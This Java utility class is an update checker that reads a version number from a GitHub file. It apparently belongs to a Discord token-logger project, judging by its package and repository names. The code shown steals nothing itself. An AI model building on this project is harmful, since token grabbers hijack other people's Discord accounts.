package clienttokengrabber.utils;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;

public class UpdateHelper {
    private static final int VERSION = 1;
    private static final String INFO_URL = "https://raw.githubusercontent.com/0x5d0/Discord-Token-Logger/master/examples/Version%20Info";

    public static boolean checkForUpdates() {
        return getUpdateInfo().get("version").asInt() > VERSION;
    }

    public static JsonNode getUpdateInfo() {
        try {
            ObjectMapper objectMapper = new ObjectMapper();
            return objectMapper.readTree(Requests.get(INFO_URL, null));
        } catch (Exception ignored) {}
        return null;
    }
}
